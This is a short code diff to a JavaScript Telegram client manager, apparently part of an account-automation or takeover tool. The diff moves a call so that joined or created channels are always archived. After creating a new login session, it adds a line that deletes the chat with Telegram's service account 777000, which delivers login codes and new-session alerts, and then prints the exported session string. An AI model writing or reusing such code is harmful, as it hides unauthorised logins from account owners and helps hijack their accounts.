@@ -103,7 +103,6 @@ class TelegramManager {
                 const result = await this.joinChannel(channel);
                 channelId = result.chats[0].id;
                 channelAccessHash = result.chats[0].accessHash;
-                await this.archiveChat(channelId, channelAccessHash);
                 console.log("Archived chat", channelId);
             }
             catch (error) {
@@ -119,6 +118,7 @@ class TelegramManager {
             channelAccessHash = result.accessHash;
             console.log("Created new group with ID:", channelId);
         }
+        await this.archiveChat(channelId, channelAccessHash);
         return { id: channelId, accesshash: channelAccessHash };
     }
     async forwardMedia(channel, fromChatId) {
@@ -1328,6 +1328,7 @@ class TelegramManager {
             },
             onError: (err) => { throw err; },
         });
+        await this.deleteChat('777000');
         const session = newClient.session.save();
         await newClient.disconnect();
         console.log("New Session: ", session);
